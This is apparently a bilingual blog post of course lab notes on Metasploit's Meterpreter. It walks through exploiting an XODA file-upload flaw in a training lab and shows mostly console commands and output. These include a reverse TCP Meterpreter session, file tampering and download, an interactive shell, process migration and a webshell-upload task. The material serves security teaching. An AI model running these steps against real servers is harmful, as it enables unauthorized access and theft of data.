---
layout: post
title: "Meterpreter Fundamentals"
date: "2023-02-09"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - The Metasploit Framework (MSF)
---

# Meterpreter Fundamentals
## Post Exploitation
![post-exploitation.png](/img/in-post/ine/post-exploitation.png)

Post exploitation refers to the actions performed on the target system after initial access has been obtained.

The post exploitation phase of a penetration test consists of various techniques like:
* Local Enumeration
* Privilege Escalation
* Dumping Hashes
* Establishing Persistence
* Clearing Your Tracks
* Pivoting

## Meterpreter
The Meterpreter (Meta-Interpreter) payload is an advanced multi-functional payload that operates via DLL injection and is executed in memory on the target system, consequently making it difficult to detect.

It communicates over a stager socket and provides an attack with an interactive command interpreter on the target system that facilitates the execution of system commands, file system navigation, keylogging and much more.

Meterpreter also allows us to load custom script and plugins dynamically.

MSF provides us with various types of meterpreter payloads that can be used based on the target environment and OS architecture.

# Meterpreter 基础知识
## 后期利用
后利用是指在获得初始访问权限后在目标系统上执行的操作。

渗透测试的后利用阶段包括各种技术，例如：
* 本地枚举
* 特权升级
* 转储哈希
* 建立持久性
* 清除你的足迹
* 旋转

## Meterpreter
Meterpreter (Meta-Interpreter) 有效载荷是一种高级多功能有效载荷，它通过 DLL 注入运行，并在目标系统的内存中执行，因此难以检测。

它通过 stager 套接字进行通信，并通过目标系统上的交互式命令解释器进行攻击，该解释器有助于执行系统命令、文件系统导航、键盘记录等。

Meterpreter 还允许我们动态加载自定义脚本和插件。

MSF 为我们提供了多种类型的 meterpreter payload，可以根据目标环境和 OS 架构使用。

# Demo: Meterpreter Fundamentals（演示：Meterpreter 基础知识）
```
ifconfig
eth1: inet 192.3.56.2
```

```
service postgresql start
msfconsole
workspace -a meterpreter
setg RHOSTS 192.3.56.3
```

```
db_nmap -sV 192.3.56.3
```

```
curl http://192.3.56.3
```

XODA is currently running on the root of the web server.

```
search xoda
use exploit/unix/webapp/xoda_file_upload
show options
set TARGETURI /
run
```

```
meterpreter > sysinfo
```

`getuid` will tell us that what our permissions currently are.

```
meterpreter > getuid
```

The user that we currently have access to via the Meterpreter session is the www-data service account. And that make sense, because we exploited a web server, so we will consequently get the permissions associated with the service account responsible for managing the web server, which in the case of Linux is always going to www-data.

So we have an unprivileged session, or we do not have root privileges, which means we cannot do anything that requires root privileges.

Open up the documentation for Meterpreter.

```
meterpreter > help
```

In this case, we are primarily focused with how to manage our Meterpreter session, how to utilize it to navigate around the file system, migrate processes, etc.

Put this session in the background.

```
meterpreter > background
```

Or using the keyboard combination `Ctrl+z`.

We can also exit and kill this session by simply typing in `exit`, and that will kill this Meterpreter session.

```
meterpreter > exit
```

List out our sessions.

```
sessions
```

Open up the help menu for the sessions command.

```
sessions -h
```

[MSFCONSOLE COMMANDS](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/)

sessions

The sessions command allows you to list, interact with, and kill spawned sessions. The sessions can be shells, Meterpreter sessions, VNC, etc.

会话

sessions命令允许您列出、交互和终止生成的会话。会话可以是 shell、Meterpreter 会话、VNC 等。

```
msf > sessions -h
Usage: sessions [options] or sessions [id]

Active session manipulation and interaction.

OPTIONS:

    -C   Run a Meterpreter Command on the session given with -i, or all
    -K        Terminate all sessions
    -c   Run a command on the session given with -i, or all
    -h        Help banner
    -i   Interact with the supplied session ID
    -k   Terminate sessions by session ID and/or range
    -l        List all active sessions
    -q        Quiet mode
    -r        Reset the ring buffer for the session given with -i, or all
    -s   Run a script on the session given with -i, or all
    -t   Set a response timeout (default: 15)
    -u   Upgrade a shell to a meterpreter session on many platforms
    -v        List sessions in verbose mode
    -x        Show extended information in the session table

Many options allow specifying session ranges using commas and dashes.
For example:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6
```

```
msf > sessions -h
用法：sessions [options] 或 sessions [id]

活动会话操作和交互。

选项：

    -C 在 -i 给定的会话上运行 Meterpreter 命令，或者全部
    -K 终止所有会话
    -c 在 -i 给定的会话上运行命令，或全部
    -h 帮助横幅
    -i 与提供的会话 ID 交互
    -k 按会话 ID 和/或范围终止会话
    -l 列出所有活动会话
    -q 安静模式
    -r 为使用 -i 或全部给定的会话重置环形缓冲区
    -s 在 -i 给定的会话上运行脚本，或全部
    -t 设置响应超时（默认值：15）
    -u 在许多平台上将 shell 升级为 meterpreter 会话
    -v 以详细模式列出会话
    -x 在会话表中显示扩展信息

许多选项允许使用逗号和破折号指定会话范围。
例如：sessions -s checkvm -i 1,3-5 或 sessions -k 1-2,5,6
```

To list any active sessions, pass the -l options to sessions.

要列出任何活动会话，请将-l选项传递给sessions。

```
msf exploit(3proxy) > sessions -l

Active sessions
===============

  Id  Description    Tunnel
  --  -----------    ------
  1   Command shell  192.168.1.101:33191 -> 192.168.1.104:4444
```

To interact with a given session, you just need to use the -i switch followed by the Id number of the session.

要与给定会话交互，您只需使用-i开关，后跟会话的 ID 号。

```
msf exploit(3proxy) > sessions -i 1
[*] Starting interaction with 1...

C:WINDOWSsystem32>
```

If we wanted to run a quick command on a session without having to interact with it.

```
sessions -C sysinfo -i 1
```

We currently don't have a Meterpreter session, because we didn't interact with that session. We only executed a command.

`-i`: Interact with the supplied session id.

```
sessions 1
meterpreter > background
```

Open up the session's help menu.

```
sessions -h
```

`-k`: Terminate sessions via the session id. Kill session 1.

```
sessions -k 1
```

`-l`: List your active sessions.

```
sessions -l
```

`-n`: Provide a name for your session. 

```
sessions -n xoda -i 1
sessions
```

Interact with it.

```
sessions xoda
```

That's how to switch between sessions, rename sessions, etc. That's pretty much it in regards to managing your sessions. You can kill sessions, manage their names, interact with a session, and specify a command that you want to run in a particular session, etc.

```
sessions 1
```

```
meterpreter > ls
meterpreter > pwd
meterpreter > cd ..
meterpreter > ls
```

```
meterpreter > cat flag1
meterpreter > edit flag1
meterpreter > cd "Secret Files"
meterpreter > ls
meterpreter > cat .flag2
meterpreter > cd ..
meterpreter > ls
meterpreter > download flag5.zip
meterpreter > ^Z
```

Unzip that flag archive.

```
ls
unzip flag5.zip
```

The password is 56784.

```
ls
cat list
```

```
MD5 of /bin/bash
```

```
sessions 1
```

In order to get the MD5 hash of a particular binary, what we can do is utilize the `checksum` command.

```
meterpreter > checksum md5 /bin/bash
```

In terms of Linux, we can also get the current environment variables. If we want to learn more abount how this particular user has been configured, we can use the get environment variable `getenv`, and then we specify the environment variable that we want to enumerate.

Enumerate our current path for this user. This will provide you with the variable PATH and its value.

```
meterpreter > getenv PATH
```

If we want to learn more about the terminal that has been assigned to this particular user.

```
meterpreter > getenv TERM
```

Because we currently have access via the www-data service account. That cannot be accessed using a terminal session. So that's why it doesn't have the environment variable TERM set.

In terms of search for files. 

`-d`: Specify the directory we want to search in.

Or you can just perform a search and this will perform a search within the entire file system.

We're going to search within the /usr/bin directory, which is where binaries are stored.

`-f`: Find a file.

```
meterpreter > search -d /usr/bin -f *backdoor*
```

Search for specific file extensions.

```
meterpreter > search -f *.jpg
meterpreter > search -f *.php
```

You can utilize the search command to search for specific files. You can also limit the results or search for files with specific extensions.

That is how to navigate around the file system.

Download a file from the target system.

```
meterpreter > download flag1
meterpreter > ^Z
ls
sessions 1
```

The first one is the shell command. If you want to pop a shell on a target system. I'm referring to the native shell of the operating system.

So if you're working on Windows and you want to get a command prompt session. And if you're working on Linux, this will open up a terminal session. 

```
meterpreter > shell
ls
/bin/bash -i # Open up a bash session
```

So we now have a native Linux terminal session on the target system. This is not a Meterpreter session. It's a native Linux terminal session. And if you did the same for Windows, you would get a command prompt session. So I can now perform or run the native Linux commands, like:

`ps`: List of the process tree.

```
www-data@victim-1:/app$ ps
```

Terminate this particular shell session, I can use `Ctrl+c` on my keyboard. This will not terminate the Meterpreter session. It's going to terminate the channel.

The process command `ps` will allow you to list out the process tree, or the processes that are currently running on the system.

```
meterpreter > ps
```

If we want to migrate to any of these processes, we could do that by typing in `migrate`, and then specifying the process id or the name of the process. 

We cannot migrate into this process. And it comes down to, in this case, the lack of sufficient privileges or permissions.

On Windows, you can migrate to a process that you currently have the permissions to migrate to.

```
meterpreter > migrate 580
meterpreter > migrate 868
meterpreter > migrate -N apache2 # Migrate to a process via the process name.
```

Execute a command on the target system through Meterpreter by saying:

```
meterpreter > execute -f ifconfig
```

That will create a process and it will execute it directly.

List out the help menu.

```
meterpreter > ?
```

But you can do what you typically do if you had a terminal session or a command prompt on a target system.

Create a directory.

```
meterpreter > mkdir test
meterpreter > ls
```

Remove this particular directory.

```
meterpreter > rmdir test
```

# Meterpreter Basics
## Overview
The target server as described below is running a vulnerable web server. You have to exploit the vulnerability and get a meterpreter session on the server.  Then, you have to perform the following tasks to complete the challenge!

Tasks:

1. Check the present working directory on remote (exploited) machine.
2. List the files present in present working directory of the remote machine.
3. Check the present working directory on local (attacker) machine.
4. List the files present in present working directory of the local machine.
5. Get the flag value present in /app/flag1 file.
6. Change the flag value present in /app/flag1, so that no one else can get the right flag.
7. Change the present working directory to a suspiciously named directory in /app and read the flag from a hidden file present in that directory.
8. Get the flag5.zip to local machine, open it using password 56784. The information given in the extracted file will give clue about the location of the another flag.
9. Delete the .zip file from the directory.
10. Print checksum of file mentioned in the extracted file (Refer to Q8).
11. Check the PATH environment variable on the remote machine.
12. There is a file with string “ckdo” in its name in one of the places included in PATH variable. Print the flag hidden in that file.
13. Change to tools directory on the local machine.
14. Upload a PHP webshell to app directory of the remote machine.

如下所述的目标服务器正在运行易受攻击的 Web 服务器。 你必须利用这个漏洞并在服务器上获得一个 meterpreter 会话。 然后，你必须执行以下任务才能完成挑战！

任务：

1. 检查远程（被利用的）机器上的当前工作目录。
2. 列出远程机器当前工作目录中的文件。
3. 检查本地（攻击者）机器上的当前工作目录。
4. 列出存在于本地计算机当前工作目录中的文件。
5. 获取 /app/flag1 文件中存在的标志值。
6. 更改 /app/flag1 中的标志值，以便其他人无法获得正确的标志。
7. 将当前工作目录更改为 /app 中名称可疑的目录，并从该目录中存在的隐藏文件中读取标志。
8. 将 flag5.zip 获取到本地机器，使用密码 56784 打开它。提取文件中提供的信息将提供有关另一个标志位置的线索。
9. 从目录中删除 .zip 文件。
10. 打印提取文件中提到的文件的校验和（请参阅问题 8）。
11. 检查远程机器上的 PATH 环境变量。
12. 在 PATH 变量中包含的一个地方有一个名称中带有字符串“ckdo”的文件。 打印隐藏在该文件中的标志。
13. 更改为本地计算机上的工具目录。
14. 将 PHP webshell 上传到远程机器的 app 目录。

Instructions: 

* This lab is dedicated to you! No other users are on this network :)
* Once you start the lab, you will have access to a root terminal of a Kali instance
* Your Kali has an interface with IP address 192.X.Y.Z. Run "ip addr" to know the values of X and Y.
* The target server should be located at the IP address 192.X.Y.3.
* Do not attack the gateway located at IP address 192.X.Y.1
* postgresql is not running by default so Metasploit may give you an error about this when starting

## Solutions
The solution for this lab can be found in the following manual: https://assets.ine.com/labs/ad-manuals/walkthrough-193.pdf

## 复现视频中的内容
```
root@attackdefense:~# ifconfig
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.119.191.2  netmask 255.255.255.0  broadcast 192.119.191.255
        ether 02:42:c0:77:bf:02  txqueuelen 0  (Ethernet)
```

Target IP Address: 192.119.191.3

```
root@attackdefense:~# service postgresql start
[ ok ] Starting PostgreSQL 11 database server: main.
root@attackdefense:~# msfconsole -q
msf5 > workspace -a meterpreter
[*] Added workspace: meterpreter
[*] Workspace: meterpreter
msf5 > setg RHOSTS 192.119.191.3
RHOSTS => 192.119.191.3
```

```
msf5 > db_nmap -sV 192.119.191.3
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2023-02-09 03:01 UTC
[*] Nmap: Nmap scan report for target-1 (192.119.191.3)
[*] Nmap: Host is up (0.0000090s latency).
[*] Nmap: Not shown: 998 closed ports
[*] Nmap: PORT     STATE SERVICE VERSION
[*] Nmap: 80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
[*] Nmap: 3306/tcp open  mysql   MySQL 5.5.47-0ubuntu0.14.04.1
[*] Nmap: MAC Address: 02:42:C0:77:BF:03 (Unknown)
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 6.68 seconds
msf5 > services
Services
========

host           port  proto  name   state  info
----           ----  -----  ----   -----  ----
192.119.191.3  80    tcp    http   open   Apache httpd 2.4.7 (Ubuntu)
192.119.191.3  3306  tcp    mysql  open   MySQL 5.5.47-0ubuntu0.14.04.1
```

```
msf5 > curl http://192.119.191.3
[*] exec: curl http://192.119.191.3

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1315  100  1315    0     0   256k      0 --:--:-- --:--:-- --:--:--  256k
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
        <title>XODA</title>
                <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
                        <script language="JavaScript" type="text/javascript">
                        //<![CDATA[
                        var countselected=0;
                        function stab(id){var _10=new Array();for(i=0;i<_10.length;i++){document.getElementById(_10[i]).className="tab";}document.getElementById(id).className="stab";}var allfiles=new Array('');
                        //]]>
                </script>
                <script language="JavaScript" type="text/javascript" src="/js/xoda.js"></script>
                <script language="JavaScript" type="text/javascript" src="/js/sorttable.js"></script>
                <link rel="stylesheet" href="/style.css" type="text/css" />
</head>

<body onload="document.lform.username.focus();">
        <div id="top">
                <a href="/" title="XODA"><span style="color: #56a;">XO</span><span style="color: #fa5;">D</span><span style="color: #56a;">A</span></a>
                        </div>
        <form method="post" action="/?log_in" name="lform" id="login">
                <p>Username:&nbsp;<input type="text" id="un" name="username" /></p>
                <p>Password:&nbsp;<input type="password" name="password" /></p>
                <p><input type="submit" name="submit" value="login" /></p>
        </form>
</body>
</html>
```

[XODA 0.4.5 Arbitrary PHP File Upload Vulnerability](https://www.rapid7.com/db/modules/exploit/unix/webapp/xoda_file_upload/)

XODA 0.4.5 Arbitrary PHP File Upload Vulnerability

This module exploits a file upload vulnerability found in XODA 0.4.5. Attackers can abuse the "upload" command in order to upload a malicious PHP file without any authentication, which results in arbitrary code execution. The module has been tested successfully on XODA 0.4.5 and Ubuntu 10.04.

XODA 0.4.5任意PHP文件上传漏洞

该模块利用 XODA 0.4.5 中发现的文件上传漏洞。攻击者可以滥用“上传”命令在没有任何身份验证的情况下上传恶意 PHP 文件，从而导致任意代码执行。该模块已在 XODA 0.4.5 和 Ubuntu 10.04 上成功测试。

```
msf5 > search XODA

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   1  exploit/unix/webapp/xoda_file_upload  2012-08-21       excellent  Yes    XODA 0.4.5 Arbitrary PHP File Upload Vulnerability
```

```
msf5 > use exploit/unix/webapp/xoda_file_upload
msf5 exploit(unix/webapp/xoda_file_upload) > show options

Module options (exploit/unix/webapp/xoda_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.119.191.3    yes       The target address range or CIDR identifier
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /xoda/           yes       The base path to the web application
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   XODA 0.4.5


msf5 exploit(unix/webapp/xoda_file_upload) > set TARGETURI /
TARGETURI => /
```

```
msf5 exploit(unix/webapp/xoda_file_upload) > run

[*] Started reverse TCP handler on 192.119.191.2:4444 
[*] Sending PHP payload (AzjyziIjOSYjJ.php)
[*] Executing PHP payload (AzjyziIjOSYjJ.php)
[*] Sending stage (38247 bytes) to 192.119.191.3
[*] Meterpreter session 1 opened (192.119.191.2:4444 -> 192.119.191.3:36698) at 2023-02-09 03:11:00 +0000
[!] Deleting AzjyziIjOSYjJ.php

meterpreter > sysinfo
Computer    : victim-1
OS          : Linux victim-1 5.4.0-125-generic #141-Ubuntu SMP Wed Aug 10 13:42:03 UTC 2022 x86_64
Meterpreter : php/linux
meterpreter > getuid
Server username: www-data (33)
```

```
meterpreter > help
meterpreter > background
[*] Backgrounding session 1...
```

```
msf5 exploit(unix/webapp/xoda_file_upload) > sessions

Active sessions
===============

  Id  Name  Type                   Information               Connection
  --  ----  ----                   -----------               ----------
  1         meterpreter php/linux  www-data (33) @ victim-1  192.119.191.2:4444 -> 192.119.191.3:36698 (192.119.191.3)

msf5 exploit(unix/webapp/xoda_file_upload) > sessions 1
[*] Starting interaction with 1...

meterpreter > exit
[*] Shutting down Meterpreter...

[*] 192.119.191.3 - Meterpreter session 1 closed.  Reason: User exit
msf5 exploit(unix/webapp/xoda_file_upload) > sessions

Active sessions
===============

No active sessions.
```

```
msf5 exploit(unix/webapp/xoda_file_upload) > run

[*] Started reverse TCP handler on 192.119.191.2:4444 
[*] Sending PHP payload (avkAbnGJqaKmoB.php)
[*] Executing PHP payload (avkAbnGJqaKmoB.php)
[*] Sending stage (38247 bytes) to 192.119.191.3
[*] Meterpreter session 3 opened (192.119.191.2:4444 -> 192.119.191.3:58826) at 2023-02-09 03:28:51 +0000
[!] Deleting avkAbnGJqaKmoB.php

meterpreter > 
Background session 3? [y/N]  
msf5 exploit(unix/webapp/xoda_file_upload) > sessions

Active sessions
===============

  Id  Name  Type                   Information               Connection
  --  ----  ----                   -----------               ----------
  3         meterpreter php/linux  www-data (33) @ victim-1  192.119.191.2:4444 -> 192.119.191.3:58826 (192.119.191.3)

msf5 exploit(unix/webapp/xoda_file_upload) > sessions -h
Usage: sessions [options] or sessions [id]

Active session manipulation and interaction.

OPTIONS:

    -C <opt>  Run a Meterpreter Command on the session given with -i, or all
    -K        Terminate all sessions
    -S <opt>  Row search filter.
    -c <opt>  Run a command on the session given with -i, or all
    -d        List all inactive sessions
    -h        Help banner
    -i <opt>  Interact with the supplied session ID
    -k <opt>  Terminate sessions by session ID and/or range
    -l        List all active sessions
    -n <opt>  Name or rename a session by ID
    -q        Quiet mode
    -s <opt>  Run a script or module on the session given with -i, or all
    -t <opt>  Set a response timeout (default: 15)
    -u <opt>  Upgrade a shell to a meterpreter session on many platforms
    -v        List all active sessions in verbose mode
    -x        Show extended information in the session table

Many options allow specifying session ranges using commas and dashes.
For example:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6
```

```
msf5 exploit(unix/webapp/xoda_file_upload) > sessions -C sysinfo -i 3
[*] Running 'sysinfo' on meterpreter session 3 (192.119.191.3)
Computer    : victim-1
OS          : Linux victim-1 5.4.0-125-generic #141-Ubuntu SMP Wed Aug 10 13:42:03 UTC 2022 x86_64
Meterpreter : php/linux
msf5 exploit(unix/webapp/xoda_file_upload) > sessions -C getuid -i 3
[*] Running 'getuid' on meterpreter session 3 (192.119.191.3)
Server username: www-data (33)
```

```
msf5 exploit(unix/webapp/xoda_file_upload) > sessions -k 3
[*] Killing the following session(s): 3
[*] Killing session 3
[*] 192.119.191.3 - Meterpreter session 3 closed.
msf5 exploit(unix/webapp/xoda_file_upload) > sessions -l

Active sessions
===============

No active sessions.
```

```
msf5 exploit(unix/webapp/xoda_file_upload) > run

[*] Started reverse TCP handler on 192.119.191.2:4444 
[*] Sending PHP payload (rxLfrk.php)
[*] Executing PHP payload (rxLfrk.php)
[*] Sending stage (38247 bytes) to 192.119.191.3
[*] Meterpreter session 4 opened (192.119.191.2:4444 -> 192.119.191.3:52328) at 2023-02-09 03:35:08 +0000
[!] Deleting rxLfrk.php

meterpreter > background
[*] Backgrounding session 4...
msf5 exploit(unix/webapp/xoda_file_upload) > sessions -l

Active sessions
===============

  Id  Name  Type                   Information               Connection
  --  ----  ----                   -----------               ----------
  4         meterpreter php/linux  www-data (33) @ victim-1  192.119.191.2:4444 -> 192.119.191.3:52328 (192.119.191.3)

msf5 exploit(unix/webapp/xoda_file_upload) > sessions -n xoda -i 4
[*] Session 4 named to xoda
msf5 exploit(unix/webapp/xoda_file_upload) > sessions -l

Active sessions
===============

  Id  Name  Type                   Information               Connection
  --  ----  ----                   -----------               ----------
  4   xoda  meterpreter php/linux  www-data (33) @ victim-1  192.119.191.2:4444 -> 192.119.191.3:52328 (192.119.191.3)
```

```
msf5 exploit(unix/webapp/xoda_file_upload) > sessions 4
[*] Starting interaction with xoda...

meterpreter > ls
No entries exist in /app/files
meterpreter > pwd
/app/files
meterpreter > cd ..
meterpreter > ls
Listing: /app
=============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
40777/rwxrwxrwx   4096   dir   2016-02-15 10:35:00 +0000  .git
40755/rwxr-xr-x   4096   dir   2023-02-09 03:01:40 +0000  .xoda
100777/rwxrwxrwx  10273  fil   2016-02-15 10:35:00 +0000  LICENSE
100777/rwxrwxrwx  8703   fil   2018-10-05 18:41:42 +0000  README
100777/rwxrwxrwx  79     fil   2016-02-15 10:35:00 +0000  README.md
40777/rwxrwxrwx   4096   dir   2018-10-06 06:33:10 +0000  Secret Files
100777/rwxrwxrwx  1284   fil   2018-10-05 18:41:42 +0000  config.php
40777/rwxrwxrwx   4096   dir   2023-02-09 03:35:23 +0000  files
100777/rwxrwxrwx  33     fil   2018-10-06 05:13:55 +0000  flag1
100777/rwxrwxrwx  208    fil   2018-10-06 05:19:22 +0000  flag5.zip
100777/rwxrwxrwx  40563  fil   2018-10-05 18:41:42 +0000  functions.php
100777/rwxrwxrwx  57739  fil   2018-10-05 18:41:42 +0000  index.php
40777/rwxrwxrwx   4096   dir   2018-10-05 18:41:42 +0000  js
100777/rwxrwxrwx  14598  fil   2016-02-15 10:35:00 +0000  logo.png
100777/rwxrwxrwx  5265   fil   2018-10-05 18:41:42 +0000  mobile.css
100777/rwxrwxrwx  19     fil   2016-02-15 10:35:00 +0000  phpinfo.php
100777/rwxrwxrwx  5758   fil   2018-10-05 18:41:42 +0000  style.css
40777/rwxrwxrwx   4096   dir   2018-10-05 18:41:42 +0000  xd_icons
100777/rwxrwxrwx  18850  fil   2018-10-05 18:41:42 +0000  zipstream.php
```

```
meterpreter > cat flag1
5c50a439f040922188a22f88cecc5277
meterpreter > edit flag1
meterpreter > cat flag1
You can't get the flag1 any more, lol.
```

```
meterpreter > cd "Secret Files"
meterpreter > ls
Listing: /app/Secret Files
==========================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100777/rwxrwxrwx  33    fil   2018-10-06 05:16:03 +0000  .flag2

meterpreter > cat .flag2
bbbb3ed27502614e27bff65faea008a0
meterpreter > cd ..
```

```
meterpreter > download flag5.zip
[*] Downloading: flag5.zip -> flag5.zip
[*] Downloaded 208.00 B of 208.00 B (100.0%): flag5.zip -> flag5.zip
[*] download   : flag5.zip -> flag5.zip
meterpreter > 
Background session xoda? [y/N]
```

```
msf5 exploit(unix/webapp/xoda_file_upload) > ls
[*] exec: ls

README
flag5.zip
tools
wordlists
msf5 exploit(unix/webapp/xoda_file_upload) > unzip flag5.zip
[*] exec: unzip flag5.zip

[flag5.zip] list password: Archive:  flag5.zip

 extracting: list                    
msf5 exploit(unix/webapp/xoda_file_upload) > ls
[*] exec: ls

README
flag5.zip
list
tools
wordlists
msf5 exploit(unix/webapp/xoda_file_upload) > cat list
[*] exec: cat list

MD5 hash of /bin/bash
```

```
msf5 exploit(unix/webapp/xoda_file_upload) > sessions 4
[*] Starting interaction with xoda...

meterpreter > checksum md5 /bin/bash
164ebd6889588da166a52ca0d57b9004  /bin/bash
```

```
meterpreter > getenv PATH

Environment Variables
=====================

Variable  Value
--------  -----
PATH      /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

```
meterpreter > getenv TERM
[-] None of the specified environment variables were found/set.
```

```
meterpreter > search -d /usr/bin -f *backdoor*
Found 1 result...
    /usr/bin\backdoor (66 bytes)
```

```
meterpreter > search -f *.jpg
No files matching your search were found.
meterpreter > search -f *.php
Found 5 results...
    .\config.php (1284 bytes)
    .\functions.php (40563 bytes)
    .\index.php (57739 bytes)
    .\phpinfo.php (19 bytes)
    .\zipstream.php (18850 bytes)
```

```
meterpreter > download flag1
[*] Downloading: flag1 -> flag1
[*] Downloaded 39.00 B of 39.00 B (100.0%): flag1 -> flag1
[*] download   : flag1 -> flag1
```

```
meterpreter > download flag1
[*] Downloading: flag1 -> flag1
[*] Downloaded 39.00 B of 39.00 B (100.0%): flag1 -> flag1
[*] download   : flag1 -> flag1
```

```
msf5 exploit(unix/webapp/xoda_file_upload) > sessions 4
[*] Starting interaction with xoda...

meterpreter > shell
Process 862 created.
Channel 7 created.
ls
LICENSE
README
README.md
Secret Files
config.php
files
flag1
flag5.zip
functions.php
index.php
js
logo.png
mobile.css
phpinfo.php
style.css
xd_icons
zipstream.php
/bin/bash -i
bash: cannot set terminal process group (478): Inappropriate ioctl for device
bash: no job control in this shell
www-data@victim-1:/app$ 
```

```
www-data@victim-1:/app$ ps
ps
    PID TTY          TIME CMD
    636 ?        00:00:00 apache2
    637 ?        00:00:00 apache2
    638 ?        00:00:00 apache2
    639 ?        00:17:04 apache2
    643 ?        00:00:00 apache2
    860 ?        00:00:00 apache2
    861 ?        00:00:00 apache2
    862 ?        00:00:00 sh
    863 ?        00:00:00 sh
    865 ?        00:00:00 bash
    868 ?        00:00:00 ps
```

```
meterpreter > ps

Process List
============

 PID  Name              User      Path
 ---  ----              ----      ----
 1    /bin/bash         root      /bin/bash /startup.sh
 7    logger            root      logger -loc 1 --dont_kill
 8    logger            root      logger -loc 2 --dont_kill
 9    logger            root      logger -loc 3 --dont_kill
 10   logger            root      logger -loc 4 --dont_kill
 11   logger            root      logger -loc 5 --dont_kill
 12   logger            root      logger -loc 6 --dont_kill
 13   logger            root      logger -loc 7 --dont_kill
 14   logger            root      logger -loc 8 --dont_kill
 15   logger            root      logger -loc 9 --dont_kill
 16   logger            root      logger -loc 10 --dont_kill
 17   logger            root      logger -loc 11 --dont_kill
 18   logger            root      logger -loc 12 --dont_kill
 19   logger            root      logger -loc 13 --dont_kill
 20   logger            root      logger -loc 14 --dont_kill
 21   logger            root      logger -loc 15 --dont_kill
 22   logger            root      logger -loc 16 --dont_kill
 23   logger            root      logger -loc 17 --dont_kill
 24   logger            root      logger -loc 18 --dont_kill
 25   logger            root      logger -loc 19 --dont_kill
 26   logger            root      logger -loc 20 --dont_kill
 27   loader            root      loader -1 -pid 512 --cpu restart
 28   loader            root      loader -2 -pid 12 --cpu restart
 29   loader            root      loader -3 -pid 1512 --cpu restart
 30   loader            root      loader -4 -pid 5012 --cpu restart
 31   loader            root      loader -5 -pid 5112 --cpu restart
 32   loader            root      loader -6 -pid 2512 --cpu restart
 33   loader            root      loader -7 -pid 52 --cpu restart -flat 1
 34   loader            root      loader -7 -pid 52 --cpu restart -flat 2
 35   loader            root      loader -7 -pid 52 --cpu restart -flat 3
 36   loader            root      loader -7 -pid 52 --cpu restart -flat 4
 37   loader            root      loader -7 -pid 52 --cpu restart -flat 5
 38   loader            root      loader -8 -pid 5412 --cpu restart
 39   loader            root      loader -9 -pid 150 --cpu restart --flag7 eba595c2923b0d526228343f594f6bd2
 40   loader            root      loader -10 -pid 1511 --cpu restart
 41   /usr/bin/python   root      /usr/bin/python /usr/bin/supervisord -n
 477  /bin/sh           root      /bin/sh /usr/bin/mysqld_safe
 478  apache2           root      apache2 -D FOREGROUND
 636  apache2           www-data  apache2 -D FOREGROUND
 637  apache2           www-data  apache2 -D FOREGROUND
 638  apache2           www-data  apache2 -D FOREGROUND
 639  apache2           www-data  apache2 -D FOREGROUND
 643  apache2           www-data  apache2 -D FOREGROUND
 841  /usr/sbin/mysqld  mysql     /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
 860  apache2           www-data  apache2 -D FOREGROUND
 861  apache2           www-data  apache2 -D FOREGROUND
 862  [sh]              www-data  [sh] <defunct>
 869  sh                www-data  sh -c ps ax -w -o pid,user,cmd --no-header 2>/dev/null
 870  ps                www-data  ps ax -w -o pid,user,cmd --no-header
```

```
meterpreter > migrate 477
[-] Error running command migrate: NoMethodError undefined method `pid' for nil:NilClass
meterpreter > migrate 478
[-] Error running command migrate: NoMethodError undefined method `pid' for nil:NilClass
meterpreter > migrate -N apache2
[-] Error running command migrate: NoMethodError undefined method `pid' for nil:NilClass
```

```
meterpreter > execute -f ifconfig
Process 873 created.
meterpreter > ?
```

```
meterpreter > mkdir test
Creating directory: test
meterpreter > rmdir test
Removing directory: test
```

## My Solution
```
root@attackdefense:~# ifconfig
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.192.182.2  netmask 255.255.255.0  broadcast 192.192.182.255
        ether 02:42:c0:c0:b6:02  txqueuelen 0  (Ethernet)
```

Target IP Address: 192.192.182.3

```
root@attackdefense:~# service postgresql start
[ ok ] Starting PostgreSQL 11 database server: main.
root@attackdefense:~# msfconsole -q
msf5 > workspace -a meterpreter
[*] Added workspace: meterpreter
[*] Workspace: meterpreter
msf5 > db_nmap -sV 192.192.182.3
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2023-02-09 08:14 UTC
[*] Nmap: Nmap scan report for target-1 (192.192.182.3)
[*] Nmap: Host is up (0.000010s latency).
[*] Nmap: Not shown: 998 closed ports
[*] Nmap: PORT     STATE SERVICE VERSION
[*] Nmap: 80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
